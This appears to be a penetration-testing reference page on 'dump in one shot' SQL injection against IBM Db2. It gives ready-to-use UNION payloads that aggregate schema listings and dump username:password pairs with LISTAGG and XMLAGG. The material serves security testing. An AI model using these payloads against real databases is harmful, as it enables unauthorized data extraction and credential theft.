---
title: "Dump in one shot (DIOS) for IBM Db2 injection"
description: "Building a single IBM Db2 union payload that concatenates schema and data into one response with XMLAGG or LISTAGG."
keywords:
  - DIOS
  - dump in one shot
  - XMLAGG
  - LISTAGG
  - Db2 mass extraction
---

# DIOS

Dump in one shot (DIOS) packs an entire enumeration into a single union payload, so one request returns the schema (and often the data) instead of a request per table or column. The term is borrowed from MySQL practice; in Db2 the aggregation is done with `XMLAGG` or `LISTAGG`.

`LISTAGG` (Db2 9.7+) is the simplest, flattening `schema.table` pairs into one string:

```sql
' UNION SELECT LISTAGG(TABSCHEMA||'.'||TABNAME,CHR(10)) WITHIN GROUP (ORDER BY TABNAME),NULL,NULL FROM SYSCAT.TABLES-- 
```

`XMLAGG` is the portable alternative and handles larger output, serializing aggregated rows to a single value:

```sql
' UNION SELECT XMLSERIALIZE(XMLAGG(XMLELEMENT(NAME r, COLNAME||',')) AS CLOB),NULL,NULL FROM SYSCAT.COLUMNS WHERE TABNAME='USERS'-- 
```

The same pattern dumps actual rows by pointing the aggregate at the target table:

```sql
' UNION SELECT LISTAGG(username||':'||password,CHR(10)) WITHIN GROUP (ORDER BY username),NULL,NULL FROM users-- 
```

`CHR(10)` is a newline separator. `LISTAGG` has a result-length limit (it errors when the aggregate overflows the result type), so for large tables raise the output type, switch to `XMLAGG`, or page with `FETCH FIRST`. DIOS is a convenience built on the same `SYSCAT` and aggregation primitives as ordinary union extraction, not a separate vulnerability.

## Tools

- **sqlmap**: automates aggregated extraction once the injection is mapped.
- **db2** (or clpplus): the Db2 client for building and testing `XMLAGG`/`LISTAGG` payloads.
- Manual testing with Burp Repeater and the Db2 client.

## References

- IBM Db2 SQL Reference: LISTAGG, XMLAGG, XMLELEMENT, XMLSERIALIZE
- OWASP Testing Guide: Testing for SQL Injection
